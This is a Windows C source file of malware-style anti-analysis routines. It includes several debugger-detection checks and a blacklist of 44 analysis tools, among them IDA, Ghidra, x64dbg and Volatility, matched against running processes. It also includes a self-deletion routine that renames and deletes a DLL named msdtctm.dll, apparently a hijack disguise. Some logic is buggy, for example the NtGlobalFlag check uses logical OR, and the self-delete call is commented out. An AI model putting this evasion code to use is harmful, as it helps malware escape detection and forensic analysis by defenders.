
#include <Windows.h>
#include <Stdio.h>
#include "Structs.h"
#include <Tlhelp32.h>
#include "Debug.h"






BOOL NtDebuggerCheck() {

	NTSTATUS					STATUS = NULL;
	fnNtQueryInformationProcess pNtQueryInformationProcess = NULL;
	DWORD64						dwIsDebuggerPresent = NULL;
	DWORD64						hProcessDebugObject = NULL;


	pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL) {
		//PRINT("\t[!] GetProcAddress Failed with error : %d\n", GetLastError());
		return FALSE;
	}

	//call proces debugport

	STATUS = pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &dwIsDebuggerPresent, sizeof(DWORD64), NULL);

	if (STATUS != 0x0) {
		//PRINT("\t[!] NtQueryInformationProcess [!] Failed with Status : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	if (dwIsDebuggerPresent != NULL) {
		return TRUE;
	}

	//CALL ProcessDebugObjectHandle

	STATUS = pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugObjectHandle, &hProcessDebugObject, sizeof(DWORD64), NULL);

	if (STATUS != 0x0) {
		//PRINT("\t[!] NtQueryInformationProcess [!] Failed with Status : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	if (hProcessDebugObject != NULL) {
		return TRUE;
	}

	return FALSE;

}

BOOL HWBPCheck() {
	CONTEXT Ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

	if (!GetThreadContext(GetCurrentThread(), &Ctx)) {
		//PRINT("\t[!] GetThreadContext Failed with error :%d \n", GetLastError());
		return FALSE;
	}

	if (Ctx.Dr0 != NULL || Ctx.Dr1 != NULL || Ctx.Dr2 != NULL || Ctx.Dr3 != NULL)
		return TRUE;

	return FALSE;
}


//}

BOOL OutoutDebugStringCheck() {
	SetLastError(1);
	OutputDebugStringW(L"axd");

	if (GetLastError() == 0) {
		return TRUE;
	}

	return FALSE;
}


#define NEW_STREAM L":MS365"

BOOL SelfDelete() {

	HMODULE	hModule = GetModuleHandleW(L"msdtctm.dll");
	WCHAR					szPath[MAX_PATH * 2] = { 0 };
	FILE_DISPOSITION_INFO	Delete = { 0 };
	HANDLE					hFile = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO		pRename = NULL;
	const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
	SIZE_T					StreamLength = wcslen(NewStream) * sizeof(wchar_t);
	SIZE_T					sRename = sizeof(FILE_RENAME_INFO) + StreamLength;

	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
		//PRINT("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

	Delete.DeleteFile = TRUE;

	pRename->FileNameLength = StreamLength;
	RtlCopyMemory(pRename->FileName, NewStream, StreamLength);

	if (GetModuleFileNameW(hModule, szPath, MAX_PATH * 2) == 0) {
		//PRINT("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		//PRINT("[!] CreateFileW Failed With Error : %d \n", GetLastError());
		return FALSE;

	}

	//PRINT(L"[!] Renameing :$DATA to %s ..", NEW_STREAM);

	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
		//PRINT("[!] SetFileInformationByHandle Failed With Error : %d \n", GetLastError());
		return FALSE;

	}

	////PRINT(L"[+] DONE \n");
	CloseHandle(hFile);

	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		//PRINT("[!] CreateFileW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	//PRINT(L"[!] DELETING...");

	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
		//PRINT("[!] SetFileInformationByHnalde Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	//PRINT(L"[+] DONE \n");

	CloseHandle(hFile);

	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;



}


#define _WIN64

BOOL IsDebuggerPresent2() {

#ifdef _WIN64
	PPEB               pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32		
	PPEB			   pPeb = (PEB*)(__readfsdword(0x30));

#endif

	if (pPeb->BeingDebugged == 1)
		return TRUE;

	return FALSE;

}

#define FLG_HEAP_ENABLE_TAIL_CHECK 0x10
#define FLG_HEAP_ENABLE_FREE_CHECK 0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x10

BOOL IsDebuggerPresent3() {
#ifdef _WIN64
	PPEB			pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB			pPeb = (PEB*)(__readgsqword(0x30));
#endif

	if (pPeb->NtGlobalFlag == (FLG_HEAP_ENABLE_TAIL_CHECK || FLG_HEAP_ENABLE_FREE_CHECK || FLG_HEAP_VALIDATE_PARAMETERS))
		return TRUE;

	return FALSE;

}


#define BLACKLISTARRAY_SIZE  44
WCHAR* g_BACKListDBS[BLACKLISTARRAY_SIZE] = {
	L"x64dbg.exe",                 // x64dbg debugger (Windows)
	L"ghidra",                    // Ghidra (Windows, Linux, macOS)
	L"ida.exe",                    // IDA Pro debugger (Windows)
	L"radare2",                      // Radar (Linux)
	L"ollydbg.exe",                // OllyDbg debugger (Windows)
	L"windbg.exe",                 // WinDbg debugger (Windows)
	L"immunitydebugger.exe",       // Immunity Debugger (Windows)
	L"apimonitor.exe",             // API Monitor (Windows)
	L"procexp.exe",                // Process Explorer (Windows)
	L"dbgview.exe",                // DebugView (Windows)
	L"sysinternals.exe",           // SysInternals (Windows)
	L"binaryninja.exe",            // Binary Ninja (Windows, Linux, macOS)
	L"gdb",                        // GDB (Linux)
	L"lldb",                       // LLDB (Linux)
	L"kgdb",                       // KGDB (Linux)
	L"nemiver",                    // Nemiver (Linux)
	L"ddd",                        // DDD (Linux)
	L"ltrace",                     // LTrace (Linux)
	L"strace",                     // Strace (Linux)
	L"strings",                     // Strace (Linux)
	L"jsdebugger.exe",             // JS Debugger (Windows, Linux)
	L"node.exe --inspect",        // Node.js Inspector (Windows, Linux)
	L"chrome.exe --debugger",     // Chrome Debugger (Windows, Linux)
	L"firefox.exe --debugger",    // Firefox Debugger (Windows, Linux)
	L"pdb.exe",                   // Python Debugger (Windows, Linux)
	L"ruby-debug.exe",            // Ruby Debugger (Windows, Linux)
	L"jdb.exe",                   // Java Debugger (Windows, Linux)
	L"jdb.exe",                   // Java Debugger (Windows, Linux)
	L"xdebug.exe",                // PHP Debugger (Windows, Linux)
	L"perl.exe -d",               // Perl Debugger (Windows, Linux)
	L"tclsh.exe -debug",          // Tcl Debugger (Windows, Linux)
	L"gdbserver",                 // GDB Server (Linux)
	L"lldb-server",               // LLDB Server (Linux)
	L"olldbg.exe",                // OllyDbg (Windows)
	L"pebear.exe",                // PEBear (Windows)
	L"pedump.exe",                // PEDump (Windows)
	L"lordpe.exe",                // LordPE (Windows)
	L"apihook.exe",               // APIHook (Windows)
	L"maldi.exe",                 // Maldi (Windows)
	L"volatility",                // Volatility (Linux)
	L"rekall",                    // Rekall (Linux)
	L"plaso",                     // Plaso (Linux)
	L"binaryninja.exe",            // Binary Ninja (Windows, Linux, macOS)
};


BOOL BlacklistCheck() {
	HANDLE hSnapShot = NULL;
	PROCESSENTRY32W		ProcEntry = { .dwSize = sizeof(PROCESSENTRY32W) };
	BOOL			 bSTATE = FALSE;

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		////PRINT("\t[!] CreateToolhelp32Snapshot Failed with error : % \n", GetLastError());
		goto _end;

	}
	if (!Process32FirstW(hSnapShot, &ProcEntry)) {
		////PRINT("\t[!] Process32FirstW failed with error : %d \n", GetLastError());
		goto _end;
	}

	do {
		for (int i = 0; i < BLACKLISTARRAY_SIZE; i++) {
			if (wcscmp(ProcEntry.szExeFile, g_BACKListDBS[i]) == 0) {
				//w//PRINTf(L"\t[!] Found \"%s\" Of Pid: %d \n", ProcEntry.szExeFile, ProcEntry.th32ProcessID);
				bSTATE = TRUE;
				goto _end;
			}
		}
	} while (Process32Next(hSnapShot, &ProcEntry));

_end:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	return bSTATE;


}



VOID check_debuuger() {
	if (NtDebuggerCheck() || HWBPCheck() || OutoutDebugStringCheck() || IsDebuggerPresent3() || HWBPCheck() || BlacklistCheck()) {
		PRINT("Debugger detected!!, start self-deleting");
		return 0;
		//SelfDelete();
	}

}

